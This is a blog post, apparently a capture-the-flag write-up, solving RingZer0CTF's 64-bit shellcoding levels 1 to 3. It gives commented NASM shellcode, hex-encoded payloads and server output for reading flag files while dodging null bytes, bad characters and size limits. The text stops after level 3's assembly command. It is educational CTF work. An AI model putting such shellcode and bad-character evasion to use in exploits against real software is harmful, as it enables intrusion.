
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Solving the X86-64 Shellcoding Challenges of RingZer0CTF - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="RingZer0Team is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun and I learned a ton &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Solving the X86-64 Shellcoding Challenges of RingZer0CTF</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-02-09T21:49:17+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:49 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p><a href="http://ringzer0team.com">RingZer0Team</a> is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun <strong>and</strong> I learned a ton about 64-bit shellcoding while solving them!</p>

<!-- more -->


<p>I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)</p>

<h2>Level 1</h2>

<p>Let&rsquo;s start easy. Upon connecting via <code>ssh</code>, the challenge presents us with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh level1@shellcode.ringzer0team.com -p 7771
</span><span class='line'>level1@shellcode.ringzer0team.com's password: 
</span><span class='line'>Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
</span><span class='line'>Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37
</span><span class='line'>
</span><span class='line'>RingZer0 Team CTF Shellcoding Level 1
</span><span class='line'>Submit your shellcode using hex representation "\xcc\xcd".
</span><span class='line'>Type "end" to exit.
</span><span class='line'>
</span><span class='line'>This level have no shellcode restriction.
</span><span class='line'>You main goal is to read /flag/level1.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;</span></code></pre></td></tr></table></div></figure>


<p>Although it says <em>no restriction</em>, there is one crucial restriction: NULL bytes are <strong>not</strong> allowed. This probably means that the shellcode is being copied to a buffer by <code>strcpy</code> or something similar. I found this out the hard way&hellip; Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">x64 syscall table</a> which lists all the syscalls and the arguments.</p>

<p>To avoid NULL bytes, registers can be zeroed by using <code>xor</code>. To set a byte-sized value, the value can be <code>push</code>ed and then <code>pop</code>ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>mov dword [rsp], '/fla'     ; build filename on stack
</span><span class='line'>mov dword [rsp+4], 'g/le'
</span><span class='line'>mov dword [rsp+8], 'vel1'
</span><span class='line'>mov dword [rsp+12], '.fla'
</span><span class='line'>push 'g'
</span><span class='line'>pop rcx
</span><span class='line'>mov [rsp+16], ecx
</span><span class='line'>
</span><span class='line'>lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
</span><span class='line'>xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>inc rax                     ; syscall open = 2
</span><span class='line'>syscall 
</span><span class='line'>
</span><span class='line'>mov rbx, rax                ; filehandle of opened file
</span><span class='line'>
</span><span class='line'>lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
</span><span class='line'>mov rdi, rbx                ; rbx was the filehandle
</span><span class='line'>push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
</span><span class='line'>pop rdx
</span><span class='line'>xor rax, rax                ; syscall read = 0
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>lea rsi, [rsp]              ; the contents of the file were on the stack
</span><span class='line'>xor rdi, rdi
</span><span class='line'>inc rdi                     ; filehandle; stdout!
</span><span class='line'>mov rdx, rax                ; rax was amount of bytes read by syscall read
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>syscall                     ; syscall write = 1
</span><span class='line'>
</span><span class='line'>push byte 60                ; some bytes left...
</span><span class='line'>pop rax                     ; exit cleanly
</span><span class='line'>syscall
</span></code></pre></td></tr></table></div></figure>


<p>To assemble and generate the shellcode in the format which the challenge wants, I used this command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./level1-nonulls.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./level1-nonulls <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./level1-nonulls
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>c7<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>2f<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>04<span class="se">\x</span>67<span class="se">\x</span>2f<span class="se">\x</span>6c<span class="se">\x</span>65<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>08<span class="se">\x</span>76<span class="se">\x</span>65<span class="se">\x</span>6c<span class="se">\x</span>31<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>0c<span class="se">\x</span>2e<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>6a<span class="se">\x</span>67<span class="se">\x</span>59<span class="se">\x</span>89<span class="se">\x</span>4c<span class="se">\x</span>24<span class="se">\x</span>10<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>3c<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c3<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>6a<span class="se">\x</span>3c<span class="se">\x</span>58<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">100</span> ./level1-nonulls
</span></code></pre></td></tr></table></div></figure>


<p>It spits out the shellcode, ready for copy &amp; paste, along with the size of the shellcode. Running it versus the server yields the flag!</p>

<h2>Level 2</h2>

<p>The password for level 2 is the flag of level 1. It seems the ante has been upped:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RingZer0 Team CTF Shellcoding Level 2
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\x2e\x62\x99&quot;</span> max size <span class="m">50</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level2.flag
</span></code></pre></td></tr></table></div></figure>


<p>So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called <em>bad chars</em>. This will restrict the instructions we can use in the shellcode. Let&rsquo;s have a look at how we can trim the fat off of the shellcode of level 1.</p>

<p>First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char <code>0x2f</code> which is the slash <code>/</code>. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>xor rax, rax        <span class="p">;</span> syscall <span class="nb">read</span> <span class="o">=</span> 0
</span><span class='line'>xor rdi, rdi        <span class="p">;</span> we<span class="s1">&#39;ll read from stdin</span>
</span><span class='line'><span class="s1">mov rsi, rsp        ; one byte shorter than &#39;</span>lea rsi, <span class="o">[</span>rsi<span class="o">]</span><span class="err">&#39;</span>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> number of bytes to <span class="nb">read</span>, enough <span class="k">for</span> the filename
</span><span class='line'>pop rdx
</span><span class='line'>syscall   
</span><span class='line'>
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>inc rax             <span class="p">;</span> syscall open
</span><span class='line'>                    <span class="p">;</span> instead of setting rdi to the filename <span class="o">(</span>located on the stack<span class="o">)</span>,
</span><span class='line'>                    <span class="p">;</span> we re-use the fact that rdi is zero and rsi points to that filename
</span><span class='line'>xchg rsi, rdi       <span class="p">;</span> now <span class="nv">rsi</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>O_RDONLY<span class="o">)</span>, and rdi points to the filename we just <span class="nb">read</span>
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>xchg rax, rsi       <span class="p">;</span> after this, rsi contains the filehandle of the opened file, rax contains 0
</span><span class='line'>xchg rdi, rsi       <span class="p">;</span> after this, rdi contains the filehandle and rsi points to the stack <span class="o">(</span>a buffer!<span class="o">)</span>
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> <span class="nb">read </span><span class="m">127</span> bytes, should be plenty
</span><span class='line'>syscall             <span class="p">;</span> because we <span class="nb">set </span>rax to 0, this will call syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax             <span class="p">;</span> syscall write
</span><span class='line'>mov rdi, rax        <span class="p">;</span> copy the value of rax to rdi <span class="o">(</span><span class="nv">1</span> <span class="o">=</span> stdout<span class="o">)</span>
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> grab the flag!
</span></code></pre></td></tr></table></div></figure>


<p>Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./level2-shellcode.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./level2-shellcode <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./level2-shellcode
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>f7<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>96<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>fe<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">49</span> ./level2-shellcode
</span></code></pre></td></tr></table></div></figure>


<p>Running it on the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>shellcode&gt;<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>f7<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>96<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>fe<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>49<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level2.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>  Error: SIGSEGV received I think your shellcode is not working
</span></code></pre></td></tr></table></div></figure>


<p>After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing <code>Ctrl+Space</code> to send a NULL byte. When done, pressing enter will yield the flag!</p>

<h2>Level 3</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31&quot;</span> max size <span class="m">50</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level3.flag
</span></code></pre></td></tr></table></div></figure>


<p>Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars <code>0x48</code> and <code>0x31</code> make the use of <code>xor rax, rax</code> and the like impossible! Instead, to zero a register, something like this can be done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>push byte <span class="m">1</span>     <span class="p">;</span> 0x6a, 0x01
</span><span class='line'>pop rbx         <span class="p">;</span> 0x5b
</span><span class='line'>dec bl          <span class="p">;</span> 0xff
</span></code></pre></td></tr></table></div></figure>


<p>This effectively clears <code>rbx</code>. This register also typically keeps it&rsquo;s original value after a syscall (it&rsquo;s non-volatile), so it&rsquo;s a good place to store something we&rsquo;ll use more often.</p>

<p>Furthermore, I like to use <code>xchg</code> to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a <code>0x48</code> byte, which is a bad char. Instead, the values can be passed around via the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span> instruction   <span class="p">;</span> opcode
</span><span class='line'><span class="p">;</span> --------------<span class="p">|</span>-------
</span><span class='line'>push rax        <span class="p">;</span> 0x50
</span><span class='line'>push rbx        <span class="p">;</span> 0x53
</span><span class='line'>pop rax         <span class="p">;</span> 0x58
</span><span class='line'>pop rbx         <span class="p">;</span> 0x5b
</span></code></pre></td></tr></table></div></figure>


<p>The effect of this is that <code>rax</code> now contains the value of <code>rbx</code> and vice-versa. Without further ado, the shellcode for level 3:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>push byte 1
</span><span class='line'>pop rbx
</span><span class='line'>dec bl              <span class="p">;</span> rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48.
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax             <span class="p">;</span> rax is now zeroed out too.
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rdi             <span class="p">;</span> stdin is zero, so zero out rdi as well
</span><span class='line'>
</span><span class='line'>push rsp            <span class="p">;</span> make rsi point to the top of the stack
</span><span class='line'>pop rsi             <span class="p">;</span> the buffer <span class="k">for</span> syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> <span class="nb">read </span>in <span class="m">18</span> bytes
</span><span class='line'>pop rdx
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax
</span><span class='line'>inc al
</span><span class='line'>inc al              <span class="p">;</span> syscall open
</span><span class='line'>
</span><span class='line'><span class="p">;</span>xchg rsi, rdi      <span class="p">;</span> we cannot use this xchg opcode because of 0x48!
</span><span class='line'>push rdi            <span class="p">;</span> instead, <span class="k">do</span> the exchange of rsi and rdi via the stack
</span><span class='line'>push rsi
</span><span class='line'>pop rdi             <span class="p">;</span> rdi is now pointing to the filename on the stack
</span><span class='line'>pop rsi             <span class="p">;</span> rsi is now zero <span class="o">(</span>flag O_RDONLY<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>syscall
</span><span class='line'>                    <span class="p">;</span> pull a similar trick here, swapping around three registers
</span><span class='line'>push rax            <span class="p">;</span> fd of just opened file
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0
</span><span class='line'>push rdi            <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> pointer to top of stack
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> buf
</span><span class='line'>pop rax             <span class="p">;</span> <span class="nv">rax</span> <span class="o">=</span> <span class="m">0</span> syscall <span class="nb">read</span>
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> fd
</span><span class='line'>
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> amount of bytes to <span class="nb">read</span>
</span><span class='line'>syscall             <span class="p">;</span> syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax
</span><span class='line'>inc al              <span class="p">;</span> syscall write
</span><span class='line'>push rax            <span class="p">;</span> copy rax <span class="o">(==</span>1<span class="o">)</span> to rdi
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">1</span> <span class="o">=</span> stdout
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointing to buffer with contents of file
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall
</span></code></pre></td></tr></table></div></figure>


<p>Assembling it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./shellcode3.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./shellcode3 <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./shellcode3
</span><span class='line'>
